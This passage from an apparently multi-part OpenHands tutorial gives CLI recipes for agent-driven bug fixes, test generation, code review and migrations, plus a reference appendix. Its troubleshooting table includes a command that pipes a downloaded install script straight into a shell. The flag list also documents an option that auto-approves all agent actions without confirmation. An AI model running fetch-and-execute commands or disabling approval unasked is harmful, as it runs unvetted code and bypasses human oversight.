# Different model architectures catch different bug categories
```


## 11.5 When Multi-Agent Wins

| Scenario | Single Agent | Multi-Agent |
|---|---|---|
| Fix one bug in one file | ✓ Fast | ✗ Overhead |
| Add feature touching 3 files | ✓ Good | ~ Equal |
| Migrate 45 components | ✗ Context overflow | ✓ 10x speedup |
| Security audit of codebase | ✗ Misses patterns | ✓ Cross-vendor catches more |
| Generate tests for 20 modules | ✗ Slow, repetitive | ✓ Parallel = 20x faster |


## Next

→ [go to Section 12](#12-) — Complete end-to-end workflows for real tasks


# 12 — Real-World Recipes

**Goal:** Complete end-to-end workflows for the most common software engineering tasks.

**What You'll Learn:**
- Recipe 1: Bug Fix from GitHub Issue to PR
- Recipe 2: Dependency Update with Test Verification
- Recipe 3: Generate a Full Test Suite
- Recipe 4: Code Review Automation
- Recipe 5: Greenfield Project Scaffolding
- Recipe 6: Legacy Code Migration


## 12.1 Recipe 1: Bug Fix — Issue → PR

The classic OpenHands workflow: take a bug report and produce a merged PR.


```bash
# ─── Step 1: Clone and set up ───
git clone https://github.com/your-org/your-repo.git
cd your-repo
git checkout -b fix/issue-42

# ─── Step 2: Run OpenHands with the issue ───
# The agent reads the codebase, identifies the bug, writes a fix + tests
openhands --headless --override-with-envs \
  -t "Fix issue #42: DatePicker crashes when selecting Feb 29 in non-leap years.
       The bug report says the crash is in src/components/DatePicker.tsx line 142.
       Write a fix, add a unit test for the leap-year edge case,
       and verify all existing tests still pass."

# ─── Step 3: Review the agent's work ───
git diff
npm test

# ─── Step 4: Commit and create PR ───
git add -A
git commit -m "fix: DatePicker crash on Feb 29 in non-leap years

Adds leap-year validation before creating Date object.
Includes unit test for edge case.
Closes #42"
git push origin fix/issue-42
gh pr create --title "Fix: DatePicker Feb 29 crash (#42)" \
    --body "Automated fix by OpenHands. Adds validation + test."
```

## 12.2 Recipe 2: Dependency Update

Automate the tedious cycle of updating deps, running tests, and fixing breakage.


```bash
# ─── Step 1: Update all dependencies ───
pip install --upgrade -r requirements.txt

# ─── Step 2: Run tests to see what broke ───
pytest 2>&1 | tee test-output.txt

# ─── Step 3: Have OpenHands fix the breakage ───
# Pass the test output so the agent knows exactly what failed
openhands --headless --override-with-envs \
  -t "Dependencies were just updated. Tests are failing.
       The test output is in test-output.txt.
       Fix all test failures by updating code to work with new dependency versions.
       Do NOT downgrade any packages — fix the code, not the versions."

# ─── Step 4: Verify everything passes ───
pytest && echo "✓ All tests pass with updated dependencies"

# ─── Step 5: Commit ───
git add -A
git commit -m "chore: update dependencies and fix compatibility"
```

## 12.3 Recipe 3: Generate a Test Suite

Give OpenHands a module with 0% coverage and get a comprehensive test suite.


```bash
# ─── Target: an untested module ───
# src/services/payment.py — 0% test coverage, 500 lines, 12 functions

openhands --headless --override-with-envs \
  -t "Generate a comprehensive test suite for src/services/payment.py.
       Requirements:
       1. Use pytest (the project standard)
       2. Write tests to tests/services/test_payment.py
       3. Cover ALL functions: process_payment, refund, calculate_tax,
          validate_card, create_invoice, etc.
       4. Include edge cases: zero amounts, negative amounts, max values,
          invalid card numbers, expired cards, network failures
       5. Mock external services (Stripe API, tax calculator)
       6. Aim for >90% line coverage
       7. All tests must pass: run pytest tests/services/test_payment.py
          and iterate until green"

# ─── Verify ───
pytest tests/services/test_payment.py --cov=src/services/payment --cov-report=term
# Expected: 90%+ coverage, all tests pass
```

## 12.4 Recipe 4: Code Review Automation

Have OpenHands review a PR diff for bugs, security issues, and style problems.


```bash
# ─── Get the PR diff ───
gh pr diff 123 > pr_diff.txt

# ─── Have OpenHands review it ───
openhands --headless --override-with-envs \
  -t "Review the PR diff in pr_diff.txt.
       Write your review to REVIEW.md with these sections:
       1. Summary: what this PR does
       2. Bugs Found: actual logic errors (NOT style nits)
       3. Security Issues: injection risks, exposed secrets, auth bypasses
       4. Performance: N+1 queries, unnecessary allocations, blocking calls
       5. Test Quality: missing edge cases, brittle assertions
       6. Recommendation: APPROVE, REQUEST_CHANGES, or COMMENT

       Only flag REAL issues — not personal preferences.
       Cite specific line numbers from the diff."

# ─── Post the review to GitHub ───
gh pr review 123 --body "$(cat REVIEW.md)"
```

## 12.5 Recipe 5: Greenfield Project Scaffolding

Generate an entire project from a specification.


```bash
mkdir my-fastapi-app && cd my-fastapi-app

openhands --headless --override-with-envs \
  -t "Create a production-ready FastAPI application:

       Features:
       - REST API for a task management app (CRUD: tasks, users)
       - PostgreSQL with SQLAlchemy async
       - Alembic for migrations
       - Pydantic v2 for validation
       - JWT authentication (access + refresh tokens)
       - Rate limiting (slowapi)
       - Structured logging (structlog)
       - Health check endpoint
       - OpenAPI docs at /docs

       Project structure:
       app/
         main.py          — FastAPI app factory
         config.py        — Settings from env vars
         models/          — SQLAlchemy models
         schemas/         — Pydantic schemas
         api/v1/          — Route handlers
         core/            — Auth, deps, security
       tests/
       alembic/
       Dockerfile
       docker-compose.yml
       README.md

       Write ALL files with full implementations.
       Include docstrings and type hints throughout.
       Run the tests to verify: pytest -v"
```

## 12.6 Recipe 6: Legacy Migration

Migrate from deprecated libraries or patterns.


```bash
# ─── Migrate from Flask to FastAPI ───

openhands --headless --override-with-envs \
  -t "Migrate this Flask application to FastAPI:

       1. Convert Flask routes to FastAPI path operations
       2. Replace Flask request objects with FastAPI dependency injection
       3. Convert Flask-SQLAlchemy to SQLAlchemy 2.0 async
       4. Replace Flask-JWT with python-jose + passlib
       5. Add Pydantic models for all request/response schemas
       6. Update tests from pytest-flask to httpx TestClient
       7. Add type hints to all functions

       Rules:
       - Preserve ALL existing behavior — this is a refactor, not a rewrite
       - Keep the same URL paths where possible
       - All existing tests must pass (updated for FastAPI)
       - Add migration notes to MIGRATION.md"

# ─── After migration ───
pytest && echo "✓ Migration complete, all tests pass"
cat MIGRATION.md
```

## 12.7 Recipe Selection Guide

| Your Situation | Recommended Recipe |
|---|---|
| Bug assigned to you, want AI to fix it | Recipe 1: Bug Fix |
| Dependabot PR broke everything | Recipe 2: Dependency Update |
| Legacy module with 0 tests | Recipe 3: Test Generation |
| PR review piling up | Recipe 4: Code Review |
| Starting a new project | Recipe 5: Scaffolding |
| Python 2 → 3, Flask → FastAPI, JS → TS | Recipe 6: Migration |


## Next

→ [go to Section 13](#13-) — Complete cheat sheet, CLI reference, and glossary


# 13 — Appendix: Cheat Sheet, CLI Reference & Glossary

**Goal:** One-stop reference for all OpenHands commands, SDK APIs, and terminology.


## 13.1 CLI Command Reference

### Main Command

| Command | Description |
|---|---|
| `openhands` | Launch interactive TUI |
| `openhands --tui` | Same as above (explicit) |
| `openhands --headless -t "task"` | Run task without UI |
| `openhands --headless -f file.txt` | Run task from file |
| `openhands --headless --json -t "task"` | JSONL output mode |
| `openhands --continue` / `-c` | Resume last session |

### Subcommands

| Command | Description | Key Options |
|---|---|---|
| `openhands serve` | Launch GUI server (Docker) | `--mount-cwd`, `--gpu` |
| `openhands web` | Browser-based TUI | `--host`, `--port`, `--debug` |
| `openhands cloud` | Create cloud session | `-t`, `-f`, `--server-url` |
| `openhands acp` | Start ACP server for IDE | `--resume`, `--last`, `--always-approve`, `--llm-approve` |
| `openhands agent-server` | Start Agent Server | (Docker recommended for production) |

### Flags

| Flag | Effect |
|---|---|
| `--always-approve` | Auto-approve all actions (no confirmation) |
| `--llm-approve` | Use LLM for action safety approval |
| `--override-with-envs` | Use LLM_API_KEY, LLM_MODEL, LLM_BASE_URL env vars |
| `--exit-without-confirmation` | Exit without confirmation dialog |
| `--streaming` | Enable token-by-token streaming (ACP mode) |


## 13.2 SDK Quick Reference

### Core Objects

```python
from openhands.sdk import LLM, Agent, Conversation

# LLM — the language model
llm = LLM(model="gpt-5.5", api_key="sk-...")

# Agent — LLM + tools
agent = Agent(
    llm=llm,
    tools=[Tool(name=FileEditorTool.name), Tool(name=TerminalTool.name)],
    system_prompt="You are a Python expert.",  # Optional
)

# Conversation — execution loop
conv = Conversation(
    agent=agent,
    workspace="/path/to/project",  # LocalWorkspace or RemoteWorkspace
    max_iterations=100,            # Max agent loop cycles
    condenser=LLMCondenser(...),   # Optional context compression
)
conv.send_message("Your task here")
conv.run()  # Blocks until agent finishes or hits limit
```


## 13.3 Built-in Tools Reference

| Tool | Import | Actions |
|---|---|---|
| FileEditor | `openhands.tools.file_editor.FileEditorTool` | read, write, edit, search, list |
| Terminal | `openhands.tools.terminal.TerminalTool` | Bash execution, background, timeout |
| TaskTracker | `openhands.tools.task_tracker.TaskTrackerTool` | Create/update/complete subtasks |
| WebBrowser | `openhands.tools.web_browser.WebBrowserTool` | Navigate, click, extract, JS eval |
| MCP | `openhands.tools.mcp.MCPTool` | Connect external MCP servers |


## 13.4 Provider & Model Strings

| Provider | Model String Example | Notes |
|---|---|---|
| OpenAI | `gpt-5.5`, `gpt-5.5-codex`, `gpt-5.4` | Auto-detected |
| Anthropic | `claude-sonnet-4-5`, `claude-opus-4-8` | Auto-detected |
| OpenRouter | `openrouter:anthropic/claude-sonnet-4` | Prefix with `openrouter:` |
| DeepSeek | `deepseek:deepseek-chat` | Prefix with `deepseek:` |
| Google | `gemini/gemini-3-pro` | Prefix with `gemini/` |
| Ollama | `ollama/qwen3:32b` | Local — prefix with `ollama/` |
| Custom | Any litellm-compatible string | Set `LLM_BASE_URL` for custom endpoints |


## 13.5 Configuration Files

| File | Location | Purpose |
|---|---|---|
| `settings.json` | `~/.openhands/` | LLM provider, model, credentials |
| `agent_settings.json` | `~/.openhands/` | Agent behavior, condenser config |
| `cli_config.json` | `~/.openhands/` | CLI/TUI preferences |
| `mcp.json` | `~/.openhands/` | MCP server definitions |
| `acp.json` | `~/.jetbrains/` | JetBrains ACP configuration |


## 13.6 Exit Codes

| Code | Meaning |
|---|---|
| `0` | Task completed successfully |
| `1` | Task failed or agent errored |
| `2` | Invalid arguments or configuration |


## 13.7 Environment Variables

| Variable | Purpose | Required For |
|---|---|---|
| `LLM_API_KEY` | API key for LLM provider | `--override-with-envs` flag |
| `LLM_MODEL` | Model identifier | `--override-with-envs` flag |
| `LLM_BASE_URL` | Custom endpoint URL | Local models, proxies |
| `AGENT_SERVER_KEY` | Auth token for Agent Server | Remote execution |
| `SANDBOX_VOLUMES` | Directories to mount in Docker | Custom sandbox paths |


## 13.8 Glossary

| Term | Definition |
|---|---|
| **Action** | A proposed operation by the agent (write file, run bash, etc.) |
| **ACP** | Agent Client Protocol — JSON-RPC 2.0 for IDE-agent communication |
| **Agent** | The reasoning-action loop: LLM + tools |
| **Agent Server** | REST/WebSocket server for remote agent execution |
| **Condenser** | Component that compresses conversation history for context limits |
| **Conversation** | A session with event history, driving the agent loop |
| **Event** | Immutable record of an action, observation, or state change |
| **Headless** | CLI mode without UI — for CI/CD and automation |
| **LLM** | Large Language Model — the reasoning engine behind agents |
| **MCP** | Model Context Protocol — standard for connecting tools to LLMs |
| **Observation** | The result of executing an action |
| **Sandbox** | Isolated execution environment (typically Docker) |
| **Security Analyzer** | Evaluates action risk before execution |
| **Skill** | Reusable prompt fragment with trigger-based activation |
| **Tool** | What an agent can DO — FileEditor, Terminal, WebBrowser, etc. |
| **TUI** | Terminal User Interface — the interactive CLI mode |
| **Workspace** | Where the agent works — local directory, Docker, or remote server |


## 13.9 Troubleshooting Quick Reference

| Symptom | Likely Cause | Fix |
|---|---|---|
| Agent loops forever | No finish condition | Set `max_iterations` lower |
| Context truncated mid-task | History exceeded context window | Configure a condenser, use a model with larger context |
| "Permission denied" in Docker | Container UID mismatch | Use `setfacl` on workspace dir |
| Agent can't find files | Wrong workspace path | Use absolute paths, check `--mount-cwd` |
| API errors | Invalid key or model name | Verify with `curl` to provider API |
| MCP tools not appearing | MCP server not configured | Check `~/.openhands/mcp.json` |
| Headless mode hangs | Task too complex, agent stuck | Add timeout, simplify task |
| "uv: command not found" | uv not installed | `curl -LsSf https://astral.sh/uv/install.sh \| sh` |


## 13.10 Comparison: When to Use What

| I want to... | Use... |
|---|---|
| Chat with an AI about my code interactively | `openhands` (TUI) |
| Automate a task in CI/CD | `openhands --headless` |
| Build a custom agent application | Python SDK (`openhands.sdk`) |
| Use OpenHands inside IntelliJ | `openhands acp` + JetBrains config |
| Deploy an agent for my team | Agent Server (REST API) |
| Try OpenHands without installing | `openhands cloud` or app.all-hands.dev |
| Give an agent a custom tool | Extend `BaseTool` (see Notebook 05) |
| Control what an agent can do | Security Analyzer + approval modes (Notebook 07) |
| Break a huge task into smaller ones | Task decomposition + multi-agent (Notebook 11) |


## 13.11 SDK Version Compatibility

| Component | Minimum Version | Recommended |
|---|---|---|
| Python | 3.12 | 3.12+ |
| uv | 0.11.6 | Latest |
| Docker | 24.0 | Latest stable |
| OpenHands CLI | v1.0+ | Latest |
| openhands-sdk | Matches CLI version | Latest |
| JetBrains IDE (for ACP) | 2025.3+ | Latest |


## 13.12 Useful Links

- **Docs:** <https://docs.openhands.dev>
- **SDK Docs:** <https://docs.openhands.dev/sdk>
- **GitHub (Platform):** <https://github.com/All-Hands-AI/OpenHands>
- **GitHub (SDK):** <https://github.com/OpenHands/software-agent-sdk>
- **GitHub (CLI):** <https://github.com/OpenHands/OpenHands-CLI>
- **PyPI:** <https://pypi.org/project/openhands>
- **Slack Community:** <https://openhands.dev/joinslack>
- **Cloud:** <https://app.all-hands.dev>
- **ACP Protocol:** <https://agentclientprotocol.com>
- **Paper (ICLR 2025):** <https://arxiv.org/abs/2407.16741>
- **SDK Paper:** <https://arxiv.org/abs/2511.03690>


## End of Tutorial

You've completed the OpenHands tutorial — from basic concepts to multi-agent orchestration.

**Key takeaways:**
1. OpenHands is an event-driven autonomous coding agent with sandboxed execution
2. The SDK follows LLM → Agent → Conversation pattern
3. Tools define what the agent can do; workspace defines where
4. Condensers and skills keep agents effective on long tasks
5. Headless mode enables CI/CD automation
6. Multi-agent orchestration tackles tasks too large for one agent

**To go deeper:**
- Read the SDK paper for the full 31-feature comparison to other SDKs
- Join the Slack community for real-world usage patterns
- Contribute to the open-source project on GitHub
- Build a custom tool for your domain-specific workflow


